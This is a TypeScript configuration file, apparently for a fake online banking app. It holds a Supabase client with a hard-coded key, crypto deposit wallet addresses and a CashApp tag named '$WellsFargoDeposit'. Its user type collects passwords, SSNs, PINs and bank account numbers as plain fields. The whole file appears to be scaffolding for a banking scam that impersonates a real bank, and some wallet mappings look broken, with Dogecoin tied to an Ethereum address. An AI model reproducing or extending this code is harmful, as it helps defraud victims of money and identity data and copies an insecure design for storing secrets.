import { createClient } from '@supabase/supabase-js';

const supabaseUrl = 'https://mmqsuwmsevpefahlocpz.supabase.co';
const supabaseAnonKey =
'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im1tcXN1d21zZXZwZWZhaGxvY3B6Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM4NzU5NjYsImV4cCI6MjA4OTQ1MTk2Nn0.bZlkoiCbOt6-ewQcGWHyfk961NMgZB3uNERpSjnkWTU';

export const supabase = createClient(supabaseUrl, supabaseAnonKey);

export const CRYPTO_WALLETS: Record<
  string,
  {name: string;symbol: string;wallet: string;}> =
{
  BTC: {
    name: 'Bitcoin',
    symbol: 'BTC',
    wallet: 'bc1qedjgpmpa69922x2pzqgyfp0nxf20wxvwzl2qvk'
  },
  ETH: {
    name: 'Ethereum',
    symbol: 'ETH',
    wallet: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4'
  },
  SOL: {
    name: 'Solana',
    symbol: 'SOL',
    wallet: 'DEHwbFtyBkKN6fR67xDjsVXTp51LuBSxeHBtUqCBMvjR'
  },
  BNB: {
    name: 'BNB Smart Chain',
    symbol: 'BNB',
    wallet: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4'
  },
  USDT: {
    name: 'USDT (ERC20)',
    symbol: 'USDT',
    wallet: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4'
  },
  USDC: {
    name: 'USDC (ERC20)',
    symbol: 'USDC',
    wallet: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4'
  },
  DOGE: {
    name: 'Dogecoin',
    symbol: 'DOGE',
    wallet: '0xdf708b40Eb7b6f252caf99Dfd7BfE031d00593D4'
  },
  TRX: {
    name: 'Tron',
    symbol: 'TRX',
    wallet: 'TXHFMFSryaVDhPkTmawzqNxdpKimd2wwp6'
  },
  XRP: {
    name: 'XRP',
    symbol: 'XRP',
    wallet: 'rUsdW7rnoR1uGwYw79U7YT1PRZL6Etk45'
  },
  LTC: {
    name: 'Litecoin',
    symbol: 'LTC',
    wallet: 'ltc1qufqrwwqcu04xn974w7vechjvqd08xd7e78yvhm'
  }
};

export const CASHAPP_TAG = '$WellsFargoDeposit';

export type User = {
  id: string;
  full_name: string;
  email: string;
  username: string;
  phone_number: string;
  date_of_birth: string;
  password: string;
  ssn: string;
  address: string;
  account_type: string;
  account_number: string;
  routing_number: string;
  balance: number;
  pin: string | null;
  profile_picture_url: string | null;
  bank_name: string | null;
  welcome_message: string | null;
  created_at: string;
};

export type Transaction = {
  id: string;
  user_id: string;
  type: string;
  category: string;
  description: string;
  amount: number;
  recipient_details: any;
  status: string;
  reference: string;
  created_at: string;
};

export type Notification = {
  id: string;
  user_id: string;
  title: string;
  message: string;
  is_read: boolean;
  created_at: string;
};